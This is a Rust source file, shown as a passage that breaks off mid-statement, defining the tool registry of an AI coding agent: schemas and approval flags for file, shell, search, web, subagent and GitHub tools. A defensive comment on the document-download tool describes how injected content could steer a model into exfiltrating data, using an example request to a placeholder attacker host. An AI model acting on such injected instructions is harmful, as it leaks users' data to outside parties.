use std::collections::HashMap;

use super::super::bash::BashTool;
use super::super::image::ImageTool;
use super::super::web_fetch::WebFetchTool;
use crate::agent::ToolDefinition;
use crate::ai::Tool;

/// Tool registry that holds tool definitions with schemas and validation logic
///
/// The registry is a HashMap-based collection of tool definitions. Each tool is
/// identified by a lowercase name and contains metadata including:
/// - Tool description and usage information
/// - JSON schema for argument validation
/// - Approval requirement (static or dynamic)
///
/// # Schema-Based Validation
///
/// Tool definitions include JSON schemas that specify:
/// - Required vs optional parameters
/// - Parameter types (string, number, boolean, object, array)
/// - Parameter descriptions for the AI
/// - Default values (via serde defaults)
///
/// The registry validates arguments by:
/// 1. Checking for presence of required fields
/// 2. Ensuring non-empty string values for required fields
/// 3. Returning missing field names for client-side error handling
///
/// # Case Insensitivity
///
/// Tool lookups are case-insensitive. "bash", "Bash", and "BASH" all resolve to
/// the same tool definition. Internally, all tool names are stored lowercase.
///
/// # Default Tools
///
/// The registry is pre-populated with built-in tools via `new()`, including
/// core file/shell tools plus search, web, GitHub, MCP resource, and IDE stubs.
///
/// # Examples
///
/// ```
/// use maestro_local_host::tools::ToolRegistry;
/// use serde_json::json;
///
/// let registry = ToolRegistry::new();
///
/// // Check if a tool exists
/// assert!(registry.get("bash").is_some());
/// assert!(registry.get("Bash").is_some());  // Case-insensitive
///
/// // Validate arguments
/// let args = json!({});
/// let missing = registry.missing_required("bash", &args);
/// assert_eq!(missing, vec!["command"]);
///
/// // Check approval requirements
/// let safe_args = json!({"command": "ls"});
/// assert!(!registry.requires_approval("bash", &safe_args));
/// ```
pub struct ToolRegistry {
    /// `HashMap` of tool definitions keyed by lowercase tool name
    ///
    /// Keys are normalized to lowercase for case-insensitive lookups.
    /// Values contain the full tool definition with schema and approval logic.
    tools: HashMap<String, ToolDefinition>,
}

impl ToolRegistry {
    /// Create a new tool registry with default tools
    #[must_use]
    pub fn new() -> Self {
        let mut tools = HashMap::new();

        // Bash tool
        tools.insert(
            "bash".to_string(),
            ToolDefinition {
                tool: BashTool::definition(),
                requires_approval: true, // Dynamic based on command
            },
        );

        // Read tool
        tools.insert(
            "read".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "read",
                    "Read a file (text, notebook, PDF, or image). Use for text files, configs, and docs. Supports images and .ipynb with automatic formatting.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file to read (relative or absolute)"
                        },
                        "file_path": {
                            "type": "string",
                            "description": "Legacy alias for path"
                        },
                        "offset": {
                            "type": "number",
                            "description": "Line number to start reading from (optional)"
                        },
                        "limit": {
                            "type": "number",
                            "description": "Number of lines to read (optional)"
                        },
                        "mode": {
                            "type": "string",
                            "description": "Reading mode: normal, head, or tail (default: normal)"
                        },
                        "lineNumbers": {
                            "type": "boolean",
                            "description": "Prefix output lines with line numbers (default: true)"
                        },
                        "line_numbers": {
                            "type": "boolean",
                            "description": "Legacy alias for lineNumbers"
                        },
                        "wrapInCodeFence": {
                            "type": "boolean",
                            "description": "Wrap output in a Markdown code fence (default: true)"
                        },
                        "wrap_in_code_fence": {
                            "type": "boolean",
                            "description": "Legacy alias for wrapInCodeFence"
                        },
                        "asBase64": {
                            "type": "boolean",
                            "description": "Return base64-encoded content instead of text (default: false)"
                        },
                        "as_base64": {
                            "type": "boolean",
                            "description": "Legacy alias for asBase64"
                        },
                        "language": {
                            "type": "string",
                            "description": "Language identifier for code fence syntax highlighting (optional)"
                        },
                        "diagnostics": {
                            "type": "boolean",
                            "description": "Include diagnostics if available (optional)"
                        },
                        "withDiagnostics": {
                            "type": "boolean",
                            "description": "Include LSP diagnostics if available (optional)"
                        }
                    },
                    "required": ["path"]
                })),
                requires_approval: false,
            },
        );

        // Write tool
        tools.insert(
            "write".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "write",
                    "Write content to a file. Creates the file if it doesn't exist.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file to write (relative or absolute)"
                        },
                        "file_path": {
                            "type": "string",
                            "description": "Legacy alias for path"
                        },
                        "content": {
                            "type": "string",
                            "description": "The content to write to the file (default: empty string)"
                        },
                        "previewDiff": {
                            "type": "boolean",
                            "description": "Return a diff preview (default: true)"
                        },
                        "backup": {
                            "type": "boolean",
                            "description": "Write a .bak copy before overwriting (default: true)"
                        }
                    },
                    "required": ["path"]
                })),
                requires_approval: true,
            },
        );

        // Glob tool
        tools.insert(
            "glob".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "glob",
                    "Find files matching a glob pattern. Returns matching file paths.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "pattern": {
                            "type": "string",
                            "description": "The glob pattern to match (e.g., '*.rs', '**/*.ts')"
                        },
                        "path": {
                            "type": "string",
                            "description": "The directory to search in (optional, defaults to cwd)"
                        }
                    },
                    "required": ["pattern"]
                })),
                requires_approval: false,
            },
        );

        // Grep tool
        tools.insert(
            "grep".to_string(),
            ToolDefinition {
                tool: Tool::new("grep", "Search for a pattern in files using ripgrep/grep.")
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "pattern": {
                                "type": "string",
                                "description": "The regex pattern to search for"
                            },
                            "path": {
                                "type": "string",
                                "description": "The file or directory to search in (optional)"
                            }
                        },
                        "required": ["pattern"]
                    })),
                requires_approval: false,
            },
        );

        // Edit tool
        tools.insert(
            "edit".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "edit",
                    "Edit files with find-and-replace. Supports single edit, multi-edit, replace-all, and dry-run.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file to edit (relative or absolute)"
                        },
                        "file_path": {
                            "type": "string",
                            "description": "Legacy alias for path"
                        },
                        "oldText": {
                            "type": "string",
                            "description": "Exact text to find and replace"
                        },
                        "newText": {
                            "type": "string",
                            "description": "Replacement text (omit or empty string to delete)"
                        },
                        "old_string": {
                            "type": "string",
                            "description": "Legacy alias for oldText"
                        },
                        "new_string": {
                            "type": "string",
                            "description": "Legacy alias for newText"
                        },
                        "edits": {
                            "type": "array",
                            "description": "Multiple edits to apply sequentially",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "oldText": {"type": "string"},
                                    "newText": {"type": "string"},
                                    "old_string": {"type": "string"},
                                    "new_string": {"type": "string"}
                                },
                                "required": ["oldText"]
                            }
                        },
                        "replaceAll": {
                            "type": "boolean",
                            "description": "Replace all occurrences (default: false)"
                        },
                        "replace_all": {
                            "type": "boolean",
                            "description": "Legacy alias for replaceAll"
                        },
                        "occurrence": {
                            "type": "number",
                            "description": "Which occurrence to replace (default: 1)"
                        },
                        "dryRun": {
                            "type": "boolean",
                            "description": "Preview diff without writing"
                        }
                    },
                    "required": ["path"]
                })),
                requires_approval: true,
            },
        );

        // Diff tool - git diff
        tools.insert(
            "diff".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "diff",
                    "Show changes in git working tree or between commits.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "Git ref to diff against (default: HEAD)"
                        },
                        "path": {
                            "type": "string",
                            "description": "File or directory path to limit diff to (optional)"
                        }
                    },
                    "required": []
                })),
                requires_approval: false,
            },
        );

        // List tool - directory listing
        tools.insert(
            "list".to_string(),
            ToolDefinition {
                tool: Tool::new("list", "List contents of a directory.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "Directory path to list (default: current directory)"
                            },
                            "recursive": {
                                "type": "boolean",
                                "description": "List files recursively (default: false)"
                            }
                        },
                        "required": []
                    }),
                ),
                requires_approval: false,
            },
        );

        // Find tool
        tools.insert(
            "find".to_string(),
            ToolDefinition {
                tool: Tool::new("find", "Search for files by glob pattern.")
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "pattern": {"type": "string", "description": "Glob pattern to match files"},
                            "path": {"type": "string", "description": "Directory to search (default: cwd)"},
                            "limit": {"type": "number", "description": "Maximum number of results (default: 1000)"},
                            "includeHidden": {"type": "boolean", "description": "Include hidden files (default: true)"}
                        },
                        "required": ["pattern"]
                    })),
                requires_approval: false,
            },
        );

        // Search tool
        tools.insert(
            "search".to_string(),
            ToolDefinition {
                tool: Tool::new("search", "Search file contents using ripgrep.")
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "pattern": {"type": "string", "description": "Regex or literal pattern"},
                            "paths": {
                                "anyOf": [
                                    {"type": "string"},
                                    {"type": "array", "items": {"type": "string"}}
                                ]
                            },
                            "glob": {
                                "anyOf": [
                                    {"type": "string"},
                                    {"type": "array", "items": {"type": "string"}}
                                ],
                                "description": "Glob filter or filters"
                            },
                            "ignoreCase": {"type": "boolean", "description": "Case-insensitive search"},
                            "literal": {"type": "boolean", "description": "Treat pattern as literal"},
                            "word": {"type": "boolean", "description": "Match whole words only"},
                            "multiline": {"type": "boolean", "description": "Enable multiline"},
                            "maxResults": {"type": "number", "description": "Maximum matches"},
                            "context": {"type": "number", "description": "Lines of context (before/after)"},
                            "beforeContext": {"type": "number", "description": "Lines of context before"},
                            "afterContext": {"type": "number", "description": "Lines of context after"},
                            "cwd": {"type": "string", "description": "Working directory"},
                            "includeHidden": {"type": "boolean", "description": "Include hidden files"},
                            "useGitIgnore": {"type": "boolean", "description": "Respect .gitignore"},
                            "outputMode": {"type": "string", "description": "content | files | count"},
                            "format": {"type": "string", "description": "text | json"},
                            "invertMatch": {"type": "boolean", "description": "Invert match"},
                            "onlyMatching": {"type": "boolean", "description": "Only matching text"},
                            "headLimit": {"type": "number", "description": "Limit output lines"}
                        },
                        "required": ["pattern"]
                    })),
                requires_approval: false,
            },
        );

        tools.insert(
            "repository_symbols".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "repository_symbols",
                    "Experimental: find Rust symbol definitions and referencing files from a revision-addressed incremental repository index.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "symbol": {
                            "type": "string",
                            "description": "One unqualified Rust identifier"
                        },
                        "maxResults": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 100,
                            "description": "Maximum definitions and referencing files to return (default 20)"
                        }
                    },
                    "required": ["symbol"]
                })),
                requires_approval: false,
            },
        );

        // Tool search keeps the default model-facing tool profile small while
        // retaining an explicit escape hatch for less common capabilities.
        tools.insert(
            "tool_search".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "tool_search",
                    "Find and activate less-common tools by name or description. The activated tools are available on the next turn.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "description": "Words describing the capability to find"},
                        "names": {"type": "array", "items": {"type": "string"}, "description": "Exact tool names to activate"},
                        "maxResults": {"type": "number", "description": "Maximum matches to activate (default 8)"}
                    }
                })),
                requires_approval: false,
            },
        );

        // Observation aging keeps the provider transcript compact while the
        // native runtime retains the original result under its call id.
        tools.insert(
            "recall_output".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "recall_output",
                    "Retrieve a previously returned tool result by its tool-call id.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "id": {"type": "string", "description": "Tool-call id named by an omitted-result marker"},
                        "offsetChars": {"type": "number", "description": "Zero-based character offset (default 0)"},
                        "maxChars": {"type": "number", "description": "Maximum characters to return (default 20000, max 100000)"}
                    },
                    "required": ["id"]
                })),
                requires_approval: false,
            },
        );

        // Composite exploration collapses the common search/read fan-out into
        // one model turn while retaining the executor's normal cache and
        // cancellation paths for each sub-operation.
        tools.insert(
            "explore".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "explore",
                    "Run up to eight independent local read/search operations in parallel and return their results in request order.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "operations": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "tool": {"type": "string", "enum": ["read", "glob", "grep", "find", "list", "search", "parallel_ripgrep", "diff"]},
                                    "args": {"type": "object"}
                                },
                                "required": ["tool", "args"]
                            }
                        }
                    },
                    "required": ["operations"]
                })),
                requires_approval: false,
            },
        );

        // Parallel ripgrep tool
        tools.insert(
            "parallel_ripgrep".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "parallel_ripgrep",
                    "Run multiple ripgrep patterns in parallel and merge results.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "patterns": {"type": "array", "items": {"type": "string"}},
                        "paths": {
                            "anyOf": [
                                {"type": "string"},
                                {"type": "array", "items": {"type": "string"}}
                            ]
                        },
                        "glob": {
                            "anyOf": [
                                {"type": "string"},
                                {"type": "array", "items": {"type": "string"}}
                            ]
                        },
                        "ignoreCase": {"type": "boolean"},
                        "literal": {"type": "boolean"},
                        "word": {"type": "boolean"},
                        "multiline": {"type": "boolean"},
                        "maxResults": {"type": "number"},
                        "context": {"type": "number"},
                        "beforeContext": {"type": "number"},
                        "afterContext": {"type": "number"},
                        "cwd": {"type": "string"},
                        "includeHidden": {"type": "boolean"},
                        "useGitIgnore": {"type": "boolean"},
                        "headLimit": {"type": "number"}
                    },
                    "required": ["patterns"]
                })),
                requires_approval: false,
            },
        );

        // Web search tool (Exa)
        tools.insert(
            "websearch".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "websearch",
                    "Search the web for current information via Exa.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "query": {"type": "string"},
                        "numResults": {"type": "number"},
                        "type": {"type": "string"},
                        "category": {"type": "string"},
                        "includeDomains": {"type": "array", "items": {"type": "string"}},
                        "excludeDomains": {"type": "array", "items": {"type": "string"}},
                        "text": {},
                        "summary": {},
                        "highlights": {},
                        "context": {},
                        "startPublishedDate": {"type": "string"},
                        "endPublishedDate": {"type": "string"},
                        "livecrawl": {"type": "string"},
                        "subpages": {"type": "object"}
                    },
                    "required": ["query"]
                })),
                requires_approval: false,
            },
        );

        // Code search tool (Exa)
        tools.insert(
            "codesearch".to_string(),
            ToolDefinition {
                tool: Tool::new("codesearch", "Search code examples and docs via Exa.")
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "query": {"type": "string"},
                            "tokensNum": {}
                        },
                        "required": ["query"]
                    })),
                requires_approval: false,
            },
        );

        // Background tasks tool
        tools.insert(
            "background_tasks".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "background_tasks",
                    "Manage long-running background tasks. Prefer logs/list (snapshots). \
                     waitForRotation defaults to non-blocking (timeoutMs=0); do not block the turn. \
                     Process exit is reported via lifecycle notifications.",
                )
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "action": {"type": "string", "description": "start | stop | list | logs | waitForRotation"},
                            "command": {"type": "string"},
                            "cwd": {"type": "string"},
                            "env": {"type": "object"},
                            "shell": {"type": "boolean"},
                            "taskId": {"type": "string"},
                            "lines": {"type": "number"},
                            "restart": {"type": "object"},
                            "timeoutMs": {
                                "type": "number",
                                "description": "waitForRotation only. Default 0 = non-blocking snapshot. Capped at 2000ms if >0."
                            }
                        },
                        "required": ["action"]
                    })),
                requires_approval: true,
            },
        );

        // Durable child-agent delegation tools. A child has its own native
        // session/transcript and can optionally work in an isolated git
        // worktree; lifecycle records are recoverable by id.
        tools.insert(
            "coding_task".to_string(),
            ToolDefinition {
                tool: Tool::new("coding_task", "Run an evidence-gated coding workflow. begin admits a contract and initializes a mission when needed; readiness returns governed Bash calls to execute normally; validate launches a trusted independent review or behavior child; complete collects actual child outputs and checks current committed revision. Use handoff to preserve and explicitly disposition unfinished work. Never submit verification results or child IDs yourself.")
                    .with_schema(serde_json::json!({
                        "type":"object", "additionalProperties":false,
                        "properties": {
                            "action":{"type":"string","enum":["begin","readiness","validate","status","handoff","complete"]},
                            "mission_id":{"type":"string"}, "work_id":{"type":"string"},
                            "contract":{"type":"object","description":"CodingAcceptanceContract with taskId, repositoryId, generation, requiredAssertionIds, requireReview=true, requireBehavior=true, readinessRequirements, authorizedSkips and authorizedDispositions. Waivers must be owner-authorized."},
                            "role":{"type":"string","enum":["review","behavior"]},
                            "retry":{"type":"boolean","description":"Replace a terminal validator attempt with a fresh independent execution."},
                            "item":{"type":"object","description":"Handoff item: id, disposition (open/resolved/deferred/dismissed), evidenceRefs."}
                        }, "required":["action"]
                    })),
                requires_approval: true,
            },
        );
        tools.insert(
            "spawn_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "spawn_subagent",
                    "Delegate a focused task to a child agent with its own session and optional worktree. Use explore for bounded read-only repository questions, plan for implementation planning, review for actionable diff findings, and code for implementation. Collect each result with wait_subagent or get_subagent. Inspect its structured handoff, continue unfinished authorized work, and resolve or report blockers before declaring the parent task complete. Procedure feedback is a reviewable proposal and must not automatically change persistent instructions. When the user explicitly asks to work in, on, or with a Computer, use backend=computer so Maestro sends the task through the managed Computer MCP launch; the runtime fills the active workspace project and repository context when omitted. Do not silently fall back to native execution if Computer is unavailable.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "task": {"type": "string", "description": "The focused task for the child agent."},
                        "role": {"type": "string", "enum": ["explore", "plan", "code", "review"]},
                        "backend": {"type": "string", "enum": ["native", "computer", "orb"], "description": "Use Maestro's local native child agent or the managed hosted Computer delegation backend. Set computer for explicit requests such as 'work on this in a Computer'; orb is a compatibility alias. Defaults to native."},
                        "specialist": {"type": "string", "description": "Named specialist focus, such as security, product, or performance. Uses the same trusted profile registry as profile; supply only one selector. Does not grant tools or permissions."},
                        "profile": {"type": "string", "description": "Optional specialist profile from a trusted .maestro/agent-profiles directory or the user profile directory. Native children use role-explore, role-plan, role-code, or role-review when that profile exists and no explicit profile is given; an explicit model overrides the profile model."},
                        "model": {"type": "string"},
                        "work_type": {"type": "string", "enum": ["lookup", "implementation", "diagnosis"], "description": "Native work type: bounded lookup uses the light tier, implementation medium, diagnosis heavy. Explicit difficulty and profile model choices take precedence. This does not grant tools or permissions."},
                        "difficulty": {"type": "string", "enum": ["light", "medium", "heavy"], "description": "Native task difficulty, independent of role. Routes through user preferences; explore defaults to light, other roles to medium."},
                        "thinking": {"type": "string", "enum": ["off", "minimal", "low", "medium", "high", "max"], "description": "Explicit native worker thinking setting. Preserved on resume."},
                        "timeout_ms": {"type": "integer", "minimum": 1, "maximum": 86_400_000, "description": "Maximum child execution time in milliseconds. Defaults to two hours."},
                        "max_tokens": {"type": "integer", "minimum": 1, "maximum": 131_072, "description": "Maximum output tokens for the child."},
                        "run_in_background": {"type": "boolean", "description": "Return immediately and let the child run asynchronously. Defaults to true."},
                        "isolation": {"type": "string", "enum": ["worktree", "shared"], "description": "Use an isolated git worktree (default) or the current workspace."},
                        "worktree_name": {"type": "string"},
                        "computer": {
                            "type": "object",
                            "description": "Optional high-level hosted Computer delegation intent. Maestro chooses the concrete launch settings from task policy; Computer owns admission and placement.",
                            "properties": {
                                "project": {"type": "string"},
                                "repository": {"type": "string", "description": "Credential-free repository intent, resolved by the hosted project policy."},
                                "title": {"type": "string"},
                                "profile": {"type": "string", "description": "Optional high-level hosted capacity profile. Omit to let Maestro choose from task role and policy."}
                            }
                        },
                        "orb": {
                            "type": "object",
                            "description": "Compatibility alias for computer. New requests should use computer.",
                            "properties": {
                                "project": {"type": "string"},
                                "repository": {"type": "string", "description": "Credential-free repository intent, resolved by the hosted project policy."},
                                "title": {"type": "string"},
                                "profile": {"type": "string", "description": "Optional high-level hosted capacity profile. Omit to let Maestro choose from task role and policy."}
                            }
                        }
                    },
                    "required": ["task"]
                })),
                requires_approval: true,
            },
        );
        tools.insert(
            "list_subagents".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "list_subagents",
                    "List durable child-agent runs for this workspace, including status and handles.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {},
                    "required": []
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "get_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "get_subagent",
                    "Read a durable child-agent record and its latest result.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "inspect_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "inspect_subagent",
                    "Inspect a child worktree's current status, diff summary, and reported files.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "cleanup_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "cleanup_subagent",
                    "Explicitly remove a terminal child worktree while retaining its durable record.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: true,
            },
        );
        tools.insert(
            "wait_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "wait_subagent",
                    "Wait briefly for a child-agent result, or return its current durable snapshot.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"},
                        "timeout_ms": {"type": "integer", "minimum": 0, "maximum": 300_000, "description": "Maximum wait in milliseconds; zero returns immediately."}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "resume_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "resume_subagent",
                    "Resume a completed, failed, or cancelled child session with a focused follow-up task.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"},
                        "task": {"type": "string"},
                        "follow_up": {"type": "string"},
                        "run_in_background": {"type": "boolean"}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: true,
            },
        );
        tools.insert(
            "cancel_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "cancel_subagent",
                    "Request cancellation of a running child-agent session.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "subagent_id": {"type": "string"}
                    },
                    "required": ["subagent_id"]
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "control_subagent".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "control_subagent",
                    "Collect a child snapshot or send an attempt-scoped steer, follow-up, interrupt, or cancellation with a durable delivery receipt.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "agent_ref": {"type": "string", "description": "Attempt-scoped handle returned by list_subagents or get_subagent."},
                        "mode": {"type": "string", "enum": ["collect", "steer", "followup", "interrupt", "cancel"]},
                        "message": {"type": "string", "description": "Required for steer and followup."},
                        "idempotency_key": {"type": "string", "description": "Optional caller-stable retry key."}
                    },
                    "required": ["agent_ref", "mode"]
                })),
                requires_approval: false,
            },
        );

        // Status tool
        tools.insert(
            "status".to_string(),
            ToolDefinition {
                tool: Tool::new("status", "Show git status (porcelain v2).").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "branchSummary": {"type": "boolean"},
                            "includeIgnored": {"type": "boolean"},
                            "paths": {
                                "anyOf": [
                                    {"type": "string"},
                                    {"type": "array", "items": {"type": "string"}}
                                ]
                            }
                        },
                        "required": []
                    }),
                ),
                requires_approval: false,
            },
        );

        // Goal tools (Codex-aligned): same model marks complete/blocked.
        tools.insert(
            "get_goal".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "get_goal",
                    "Get the current session goal (status, text, auto-continue usage).",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {},
                    "additionalProperties": false
                })),
                requires_approval: false,
            },
        );
        tools.insert(
            "update_goal".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "update_goal",
                    "Mark the active goal complete or blocked. \
                     Use complete only when the objective is achieved and verified against current state. \
                     Use blocked only when the same blocker has recurred for multiple goal turns and you cannot progress without user input. \
                     Do not mark complete merely because you are stopping work.",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "status": {
                            "type": "string",
                            "enum": ["complete", "blocked"],
                            "description": "complete when done and verified; blocked when truly stuck"
                        },
                        "reason": {
                            "type": "string",
                            "description": "Short reason (required for blocked; optional for complete)"
                        }
                    },
                    "required": ["status"],
                    "additionalProperties": false
                })),
                requires_approval: false,
            },
        );

        // Prime Agent context primitives: the slash-command surfaces remain
        // operator-friendly, while native agents get typed access to the same
        // durable harness, RLM, and mailbox stores.
        for (name, definition) in crate::tools::context_tools::definitions() {
            tools.insert(name, definition);
        }

        // Todo tool
        tools.insert(
            "todo".to_string(),
            ToolDefinition {
                tool: Tool::new("todo", "Create or update a todo checklist.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "goal": {"type": "string"},
                            "items": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "id": {"type": "string"},
                                        "content": {"type": "string"},
                                        "status": {"type": "string"},
                                        "priority": {"type": "string"},
                                        "notes": {"type": "string"},
                                        "due": {"type": "string"},
                                        "blockedBy": {
                                            "type": "array",
                                            "items": {"type": "string"}
                                        }
                                    },
                                    "required": ["content"],
                                    "additionalProperties": false
                                }
                            },
                            "updates": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "id": {"type": "string"},
                                        "status": {"type": "string"},
                                        "priority": {"type": "string"},
                                        "notes": {"type": "string"},
                                        "due": {"type": "string"},
                                        "blockedBy": {
                                            "type": "array",
                                            "items": {"type": "string"}
                                        },
                                        "content": {"type": "string"},
                                        "remove": {"type": "boolean"}
                                    },
                                    "required": ["id"],
                                    "additionalProperties": false
                                }
                            },
                            "includeSummary": {"type": "boolean"}
                        },
                        "required": ["goal"]
                    }),
                ),
                requires_approval: false,
            },
        );

        if std::env::var("MAESTRO_FEEDBACK_DRAFTS").as_deref() != Ok("off") {
            tools.insert("draft_feedback".to_owned(), ToolDefinition {
                tool: Tool::new("draft_feedback", "Prepare local product feedback when a tool repeatedly fails, the user corrects your behavior, you notice a mistake, or the user asks to report it. Describe the specific actual and expected behavior and reproduction steps. This tool never sends feedback or selects session evidence. The user reviews and sends it in /feedback. Continue the original task after drafting.").with_schema(serde_json::json!({
                    "type":"object", "properties": {
                        "description":{"type":"string","minLength":1,"maxLength":4000},
                        "expected_behavior":{"type":"string","maxLength":4000},
                        "reproduction_steps":{"type":"string","maxLength":4000}
                    }, "required":["description","expected_behavior","reproduction_steps"],"additionalProperties":false
                })), requires_approval: false,
            });
        }

        // Ask user tool
        tools.insert(
            "ask_user".to_string(),
            ToolDefinition {
                tool: Tool::new("ask_user", "Ask structured questions to the user.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "questions": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "question": {"type": "string"},
                                        "header": {"type": "string"},
                                        "options": {
                                            "type": "array",
                                            "items": {
                                                "type": "object",
                                                "properties": {
                                                    "label": {"type": "string"},
                                                    "description": {"type": "string"}
                                                },
                                                "required": ["label", "description"],
                                                "additionalProperties": false
                                            }
                                        },
                                        "multiSelect": {"type": "boolean"}
                                    },
                                    "required": ["question", "header", "options"],
                                    "additionalProperties": false
                                }
                            },
                            "background": {
                                "type": "boolean",
                                "description": "Return a durable decision task immediately so independent work can continue."
                            },
                            "deadlineSeconds": {
                                "type": "integer",
                                "minimum": 1,
                                "description": "Optional deadline for a background decision."
                            },
                            "nonBlockingReason": {
                                "type": "string",
                                "description": "Why continuing without this answer is safe."
                            }
                        },
                        "required": ["questions"],
                        "additionalProperties": false
                    }),
                ),
                requires_approval: false,
            },
        );

        // Extract document tool
        tools.insert(
            "extract_document".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "extract_document",
                    "Download a document and extract its text (PDF, DOCX, XLSX, PPTX).",
                )
                .with_schema(serde_json::json!({
                    "type": "object",
                    "properties": {
                        "url": {"type": "string"},
                        "maxChars": {"type": "number"}
                    },
                    "required": ["url"]
                })),
                // Downloads whatever URL the model supplies. Read-only for
                // the local filesystem, but the request itself (destination
                // host + query string) is an exfiltration channel: a model
                // steered by injected content elsewhere in the conversation
                // can smuggle data out via `GET https://attacker.tld/?d=...`
                // regardless of what the response contains. Same reasoning
                // as `web_fetch` below.
                requires_approval: true,
            },
        );

        // Notebook edit tool
        tools.insert(
            "notebook_edit".to_string(),
            ToolDefinition {
                tool: Tool::new("notebook_edit", "Edit Jupyter notebook (.ipynb) files.")
                    .with_schema(serde_json::json!({
                        "type": "object",
                        "properties": {
                            "path": {"type": "string"},
                            "cell_id": {"type": "string"},
                            "cell_index": {"type": "number"},
                            "new_source": {"type": "string"},
                            "cell_type": {"type": "string"},
                            "edit_mode": {"type": "string"}
                        },
                        "required": ["path", "new_source"]
                    })),
                requires_approval: true,
            },
        );

        // GitHub CLI tools (gh api)
        tools.insert(
            "gh_pr".to_string(),
            ToolDefinition {
                tool: Tool::new("gh_pr", "GitHub pull request operations via gh api.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "action": {"type": "string"},
                            "number": {"type": "number"},
                            "title": {"type": "string"},
                            "body": {"type": "string"},
                            "branch": {"type": "string"},
                            "base": {"type": "string"},
                            "draft": {"type": "boolean"},
                            "state": {"type": "string"},
                            "author": {"type": "string"},
                            "label": {"type": "array", "items": {"type": "string"}},
                            "milestone": {"type": "string"},
                            "limit": {"type": "number"},
                            "json": {"type": "boolean"},
                            "nameOnly": {"type": "boolean"},
                            "repository": {"type": "string"}
                        },
                        "required": ["action"]
                    }),
                ),
                requires_approval: true,
            },
        );

        tools.insert(
